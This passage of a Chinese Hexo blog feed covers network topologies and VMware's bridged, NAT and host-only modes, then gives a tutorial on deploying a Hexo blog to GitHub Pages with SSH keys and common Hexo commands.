title="4.树型网络拓扑结构"></a>4.树型网络拓扑结构</h3><p>树型拓扑结构是一种层次结构，结点按层次连结，信息交换主要在上下结点之间进行，相邻结点或同层结点之间一般不进行数据交换。树型拓扑结构是就是数据结构中的树。树型拓扑结构图如下:</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%A0%91%E5%BD%A2%E6%8B%93%E6%89%91.png" alt="树形拓扑"></p><p><strong>树形拓扑结构的网络特点如下：</strong></p><ul><li>网络结构简单，便于管理；</li><li>控制简单，建网容易；</li><li>网络延迟时间较短，误码率较低；</li><li>网络共享能力较差；</li><li>通信线路利用率不高；</li><li>中央结点负荷太重。</li></ul><p><strong>树型拓扑结构的结构特点如下</strong>：</p><ul><li>易于扩充。树形结构可以延伸出很多分支和子分支，这些新节点和新分支都能容易地加入网内。</li><li>故障隔离较容易。如果某一分支的节点或线路发生故障，很容易将故障分支与整个系统隔离开来。</li><li>各个节点对根节点的依赖性太大。如果根发生故障，则全网不能正常工作。</li></ul><h3 id="5-网状网络拓扑结构"><a href="#5-网状网络拓扑结构" class="headerlink" title="5.网状网络拓扑结构"></a>5.网状网络拓扑结构</h3><p>网络拓扑结构又称作无规则结构，结点之间的联结是任意的，没有规律。网状拓扑结构图如下:</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%BD%91%E7%8A%B6%E6%8B%93%E6%89%91.png" alt="网状拓扑"></p><p><strong>网状网络拓扑结构的结构特点如下：</strong></p><ul><li>网络可靠性高，一般通信子网中任意两个节点交换机之间，存在着两条或两条以上的通信路径，这样，当一条路径发生故障时，还可以通过另一条路径把信息送至节点交换机。</li><li>网络可组建成各种形状，采用多种通信信道，多种传输速率。</li><li>网内节点共享资源容易。</li><li>可改善线路的信息流量分配。</li><li>可选择最佳路径，传输延迟小。</li></ul><p>网状形网是广域网中最常采用的一种网络形式，是典型的点到点结构。在网状拓扑结构中，网络的每台设备之间均有点到点的链路连接，这种连接不经济，只有每个站点都要频繁发送信息时才使用这种方法。它的安装也复杂，但系统可靠性高，容错能力强。有时也称为分布式结构。</p><h3 id="6-混合网络型拓扑结构"><a href="#6-混合网络型拓扑结构" class="headerlink" title="6.混合网络型拓扑结构"></a>6.混合网络型拓扑结构</h3><p>混合型网络拓扑结构就是指同时使用上面的5种网络拓扑结构种两种或两种以上的网络拓扑结构。</p><p>这种网络拓扑结构是由星型结构和总线型结构的网络结合在一起的网络结构，这样的拓扑结构更能满足较大网络的拓展，解决星型网络在传输距离上的局限，而同时又解决了总线型网络在连接用户数量的限制。这种网络拓扑结构同时兼顾了星型网与总线型网络的优点，在缺点方面得到了一定的弥补。</p><p><strong>混合型网络拓扑结构的结构特点如下：</strong></p><ul><li>应用广泛</li></ul><p>这主要是因它解决了星型和总线型拓扑结构的不足，满足了大公司组网的实际需求。目前在一些智能化的信息大厦中的应用非常普遍。在一幢大厦中，各楼层间采用光纤作为总线传输介质，一方面可以保证网络传输距离，另一方面，光纤的传输性能要远好于同轴电缆， 所以，在传输性能上也给予了充分保证。当然投资成本会有较大增加，在一些较小建筑物中 也可以采用同轴电缆作为总线传输介质。各楼层内部仍普遍采用使用双绞线星型以太网。</p><ul><li>扩展灵活</li></ul><p>这主要是继承了星型拓扑结构的优点。但由于仍采用广播式的消息传送方式，所以在总 线长度和节点数量上也会受到限制，不过在局域网中的影响并不是很大。</p><ul><li>性能差</li></ul><p>因为其骨干网段(总线段)采用总线网络连接方式，所以各楼层和各建筑物之间的网络 互联性能较差，仍局限于最高1 6Mbps的速率。另外，这种结构网络具有总线型网络结构的 弱点，网络速率会随着用户的增多而下降。当然在采用光纤作为传输介质的混合型网络中， 这些影响还是比较小的。</p><ul><li>较难维护</li></ul><p>这主要受到总线型网络拓扑结构的制约，如果总线断，则整个网络也就瘫痪了，但是如果是分支网段出了故障，则不影响整个网络的正常运作。再一个就是整个网络非常复杂，维护起来不容易。</p><p>三层结构模型：接入层、汇聚层、核心层</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%BD%91%E7%BB%9C%E7%9A%84%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84.png" alt="网络的层次结构"></p><p>接入层、汇聚层、核心层</p><p>接入层：无线网络发射器，AP（提供接入网络的接口）。接入交换机通常位于机架顶部，所以它们也被称为ToR（Top of Rack）交换机，它们物理连接服务器。</p><p>汇聚层：楼层交换机、建筑物交换机（汇聚接入层设备）。汇聚交换机连接Access交换机，同时提供其他的服务，例如防火墙，SSL offload，入侵检测，网络分析等。</p><p>核心层：核心交换机（数据高速转发）。核心交换机为进出数据中心的包提供高速的转发，为多个汇聚层提供连接性，核心交换机为通常为整个网络提供一个弹性的L3路由网络。</p><h1 id="VMware的三种网络连接模式"><a href="#VMware的三种网络连接模式" class="headerlink" title="VMware的三种网络连接模式"></a>VMware的三种网络连接模式</h1><h3 id="私有地址范围："><a href="#私有地址范围：" class="headerlink" title="私有地址范围："></a>私有地址范围：</h3><p>10.0.0.0-10.255.255.255</p><p>172.16.0.0-172.31.255.255</p><p>192.168.0.0-192.168.255.255</p><p>安装完成vmware以后</p><p>进入虚拟机—&gt;&gt;设置—&gt;&gt;网络适配器</p><p>在网络适配器中可以发现vmware为我们提供了三种网络工作模式，它们分别是：</p><ol><li>Bridged（桥接模式）</li><li>NAT（网络地址转换模式）</li><li>Host-Only（仅主机模式）</li></ol><p>在网络适配器中可以发现vmware为我们提供了三种网络工作模式，它们分别是：</p><ol><li>Bridged（桥接模式）</li><li>NAT（网络地址转换模式）</li><li>Host-Only（仅主机模式）</li></ol><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AE%BE%E7%BD%AE.png" alt="虚拟机设置"></p><p> 打开vmware虚拟机，我们可以在选项栏的<strong>“编辑”</strong>下的<strong>“虚拟网络编辑器”</strong>中看到  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BC%96%E8%BE%91%E5%99%A8.png" alt="虚拟机编辑器"></p><ul><li>VMnet0表示的是用于桥接模式下的虚拟交换机；</li><li>VMnet1表示的是用于仅主机模式下的虚拟交换机；</li><li>VMnet8表示的是用于NAT模式下的虚拟交换机；</li></ul><p> 同时，在主机上对应的有显示相应的网卡信息</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%B8%BB%E6%9C%BA%E7%BD%91%E5%8D%A1%E4%BF%A1%E6%81%AF.png" alt="主机网卡信息"></p><h2 id="Bridged（桥接模式）"><a href="#Bridged（桥接模式）" class="headerlink" title="Bridged（桥接模式）"></a>Bridged（桥接模式）</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p> 什么是桥接模式？桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。  </p><p> 其网络结构如下图所示：  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F.png" alt="桥接模式"></p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>打开VMware的虚拟网络编辑器，将桥接模式下的虚拟网卡桥接到真实无线网卡或有线网卡。 </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E7%BC%96%E8%BE%91%E5%99%A8%EF%BC%88%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%EF%BC%89.png" alt="虚拟网络编辑器（桥接模式）"></p><p> 在物理机中通过win+r –&gt;cmd，进入win的命令行界面，输入命令ipconfig查看当前的网络连接信息。 </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%A1%A5%E6%8E%A5%E5%9C%B0%E5%9D%80.png" alt="桥接地址"></p><p>在虚拟机设置中，将网络适配器设置为桥接模式。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E7%BC%96%E8%BE%91%E5%99%A8%EF%BC%88%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%EF%BC%89.png" alt="虚拟网络编辑器（桥接模式）"></p><p>进入VMware中的Kali Linux系统，在终端中通过ifconfig查看Kali Linux的网络连接信息。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgKali%20Linux%E7%B3%BB%E7%BB%9F.png" alt="Kali Linux系统"></p><p>以上可以看出，host的ip为192.168.2.87，Kali Linux的ip为192.168.2.61，处于同一网段下。</p><p>此时，虚拟机可以连接外网，可以和同网段的其他真实物理主机之间相互访问呢，可以和相同模式的虚拟机之间相互访问。<strong>此模式用于ip地址资源比较充足的情况</strong></p><p><strong>缺点：</strong></p><p>但如果你的网络环境是ip资源很缺少或对ip管理比较严格的话，那桥接模式就不太适用了。如果真是这种情况的话，我们该如何解决呢？接下来，我们就来认识vmware的另一种网络模式：<strong>NAT模式</strong>。</p><h2 id="NAT（地址转换模式）"><a href="#NAT（地址转换模式）" class="headerlink" title="NAT（地址转换模式）"></a>NAT（地址转换模式）</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p> 刚刚我们说到，如果你的网络ip资源紧缺，但是你又希望你的虚拟机能够联网，这时候NAT模式是最好的选择。NAT模式借助<strong>虚拟NAT设备</strong>和<strong>虚拟DHCP服务器</strong>，使得虚拟机可以联网。其网络结构如下图所示：  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgnat%E6%A8%A1%E5%BC%8F.png" alt="nat模式"></p><p> 在NAT模式中，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。那么我们会觉得很奇怪，为什么需要虚拟网卡VMware Network Adapter VMnet8呢？原来我们的VMware Network Adapter VMnet8虚拟网卡主要是为了实现主机与虚拟机之间的通信。在之后的设置步骤中，我们可以加以验证。  </p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>首先，设置虚拟机中NAT模式的选项，打开vmware，点击“编辑”下的“虚拟网络编辑器”，设置NAT参数及DHCP参数。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg1698714931785-5ef00c52-fbf1-41fb-8b07-cd61ea8f0c05.png" alt="img"></p><p> 第2、3步：设置NAT和DHCP，使得其网段和子网网段一致。并设置网关ip和DHCP地址池范围。（.2用作默认网关和DNS服务器，.1不用作网关的原因是预留给虚拟网卡使用）  </p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/12431291/1698715166496-0f77bd5b-9faa-43bb-bea7-368688e915eb.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698715312550-ad12d973-ff91-44e0-a5b4-9b4892689c40.png" alt="img"></p><p> 第4步：更改网络适配器为NAT模式  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698718185010-c3d8448e-f42a-4735-90c8-3db04de17d66.png" alt="img"></p><p> 进入Kali Linux，查看当前ip在18网段，NAT模式实现成功。  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698718610234-d7d5814b-bcba-4018-9dd3-41d0b04ba3f6.png" alt="img"></p><p> 此时，虚拟机可以连接外网（NAT实现），可以和相同模式的虚拟机之间相互访问（同一交换机下），但不可以和同网段的其他真实物理主机之间相互访问（不同子网，且没有第三层路由器）。此模式用于ip地址资源比较稀缺的情况。  </p><p>然后，将VMware Network Adapter VMnet8启用之后，发现远程工具可以连接上虚拟机了。</p><p>那么，这就是NAT模式，利用虚拟的<strong>NAT设备</strong>以及<strong>虚拟DHCP服务器</strong>来使虚拟机连接外网，而<strong>VMware Network Adapter VMnet8虚拟网卡</strong>是用来与虚拟机通信的。</p><h2 id="Host-Only（仅主机模式）"><a href="#Host-Only（仅主机模式）" class="headerlink" title="Host-Only（仅主机模式）"></a>Host-Only（仅主机模式）</h2><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>Host-Only模式其实就是<strong>NAT模式</strong>去除了<strong>虚拟NAT设备</strong>，然后使用<strong>VMware Network Adapter VMnet1</strong>虚拟网卡连接<strong>VMnet1虚拟交换机</strong>来与<strong>虚拟机</strong>通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。其网络结构如下图所示：  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698721794018-903405aa-3afb-4d7c-8897-72406868ab58.png" alt="img"></p><h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><p>第1步：修改子网ip，不要和host所在子网冲突。（此处，我的host主机网段为1，设置Vmnet1网段为11）。  </p><p>设置“虚拟网络编辑器”，可以设置DHCP的起始范围。</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698721995387-a84e97bc-99fc-4af5-a23c-1a9a9f62aef4.png" alt="img"></h3><p> 设置DHCP地址池。  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698722057875-ffe0b7bd-a2c1-478d-a870-694c6153f790.png" alt="img"></p><p>设置虚拟机为Host-Only模式。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698722065360-9eb0845b-c4e6-4d21-a98a-75d58846f070.png" alt="img"></p><p> 进入Kali查看设置结果。  </p><h2 id="三种不同模式的区别"><a href="#三种不同模式的区别" class="headerlink" title="三种不同模式的区别"></a>三种不同模式的区别</h2><p>桥接模式相当于是虚拟机作为一台新机器连入局域网中，可以和局域网中的其他机器相互通信。</p><p>nat模式则是虚拟机在外部网络中不必具有自己的IP地址，从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。</p><p>仅主机模式在同一台主机上可以创建多个仅主机模式的虚拟网络，如果多个虚拟机处于同一个仅主机模式网络中，那么它们之间是可以相互通信的，如果处于不同的仅主机模式网络中，则默认情况下无法进行相互通信。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>配置虚拟机和使用GitHub写博客</title>
    <link href="/2023/11/07/2023-11-7-%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%92%8C%E4%BD%BF%E7%94%A8GitHub%E5%86%99%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/11/07/2023-11-7-%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%92%8C%E4%BD%BF%E7%94%A8GitHub%E5%86%99%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h3 id="配置虚拟机"><a href="#配置虚拟机" class="headerlink" title="配置虚拟机"></a>配置虚拟机</h3><p>先下载软件__VMware__（此软件是用于使用虚拟机），再将win10的虚拟机<u>（Win10_1903_V2_Chinese(Simplified)_x64.iso）</u></p><p>配置在VMware中。启动虚拟机看是否成功安装。  </p><h3 id="使用GitHub写博客"><a href="#使用GitHub写博客" class="headerlink" title="使用GitHub写博客"></a>使用GitHub写博客</h3><p>下载git、node和Typota三个软件，其中git进行GitHub中博客相关操作，Typota进行编写博客操作。下面进行博客的创建： </p><ol><li>在本地找个目录放博客源文件，路径不要有中文。</li><li>在选定的目录中，右键Git Bash Here，使用npm命令安装Hexo，输入：</li></ol><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">npm <span class="hljs-keyword">install </span>-g hexo-cli <br>hexo init <span class="hljs-keyword">blog </span><br>cd <span class="hljs-keyword">blog </span><br>hexo g <br></code></pre></td></tr></table></figure><p>创建博客。</p><ol start="3"><li>再进行ssh密钥的配置，使用语句cd ~&#x2F;.ssh用于检查本机是否有ssh密钥（如果提示：No such file or directory 说明你是第一次使用git）。</li><li>使用语句’ssh-keygen -t rsa -C “邮件地址”’，然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：写一个ssh密钥的标题，再将“C: \Users\当前用户名.ssh\id_rsa.pub”中的内容复制到key中。</li><li>完成以上操作后测试ssh连接是否成功，使用’ssh -T <a href="mailto:&#103;&#x69;&#x74;&#x40;&#103;&#x69;&#116;&#x68;&#117;&#x62;&#46;&#x63;&#111;&#x6d;">&#103;&#x69;&#x74;&#x40;&#103;&#x69;&#116;&#x68;&#117;&#x62;&#46;&#x63;&#111;&#x6d;</a>‘（邮箱地址不用改），如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，提示“Hi LINF2009! You’ve successfully authenticated, but GitHub does not provide shell access.”则连接成功。最后在选中的位置(blog目录下)打开cmd，输入’npm install hexo-deployer-git –save’，再在上一个Git Bash Here还需要继续配置</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.name</span> “xxx”<span class="hljs-comment">// 你的github用户名，非昵称</span><br>git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.email</span> “xxx@qq.com“<span class="hljs-comment">// 填写你的github注册邮箱</span><br></code></pre></td></tr></table></figure><p><em>注意：global前面的横杠是两个横杠</em></p><ol start="6"><li>在GitHub上建立一个存储库，命名为github的用户名.github.io（必须与自己github注册用户名一致，因为Github 仅能使用一个同名仓库的代码托管一个静态站点），编辑_config.yml文件，在最后改成这样</li></ol><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span> <br><span class="hljs-symbol">type:</span> git<br><span class="hljs-symbol">repository:</span> git@github.com:xxx/xxx.github.io.git<br><span class="hljs-symbol">branch:</span> main<br></code></pre></td></tr></table></figure><p>最后上传。</p><h3 id="hexo常用命令"><a href="#hexo常用命令" class="headerlink" title="hexo常用命令"></a>hexo常用命令</h3><ol><li>文章的书写</li></ol><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">hexo <span class="hljs-keyword">new</span> [layout] &lt;<span class="hljs-built_in">title</span>&gt;<br></code></pre></td></tr></table></figure><p>eg: <code>hexo new &quot;post title with whitespace&quot;</code> 其中 layout为_config.yml中的默认参数值。</p><ul><li><code>-p --path</code> 自定义新文章</li><li><code>-r --replace</code> 存在同名文章，替换</li><li><code>-s --slug</code> 文章的slug，作为新文章的文件名和发布后的URL</li></ul><p>eg： <code>hexo new page --path about/me &quot;About me&quot;</code></p><ol start="2"><li>生成静态文件</li></ol><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">hexo <span class="hljs-keyword">generate</span>` 或 `hexo g<br></code></pre></td></tr></table></figure><ul><li><code>-d 或--deploy</code> 文件生成后部署网站</li><li><code>-w 或--watch</code> 监视文件变动</li><li><code>-b 或--bail</code> 生成过程中出现异常则抛出。</li><li><code>-f 或--force</code> 强制重新生成文件</li><li><code>-c 或--concurrency</code> 最大同时生成文件数量，默认无限制。</li></ul><ol start="3"><li>发布草稿</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">hexo publish [layout] <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="4-启动服务器"><a href="#4-启动服务器" class="headerlink" title="4.启动服务器"></a>4.启动服务器</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">hexo server<span class="hljs-string">` 启动服务器，ctrl+c 结束，默认地址为：`</span>http:<span class="hljs-comment">//localhost:4000/</span><br></code></pre></td></tr></table></figure><p>5.部署网站</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">hexo deploy` 或`hexo d<br></code></pre></td></tr></table></figure><ul><li><code>-g 或--generate</code> 部署之前写成静态文件</li></ul><p>6.渲染文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hexo</span> render &lt;file1&gt;<span class="hljs-meta"> [file2]</span><br></code></pre></td></tr></table></figure><ul><li><code>-o或--output</code> 设置输出路径</li></ul><ol start="7"><li>清除缓存文件</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br></code></pre></td></tr></table></figure><ol start="8"><li>列出网站资料</li></ol><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">hexo</span> list &lt;<span class="hljs-keyword">type</span>&gt;<br></code></pre></td></tr></table></figure><ol start="9"><li>显示草稿</li></ol><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">hexo <span class="hljs-comment">--deaft</span><br></code></pre></td></tr></table></figure><ol start="10"><li>自定义当前工作目录</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">hexo <span class="hljs-attr">--cwd</span> /path/<span class="hljs-selector-tag">to</span>/cwd<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
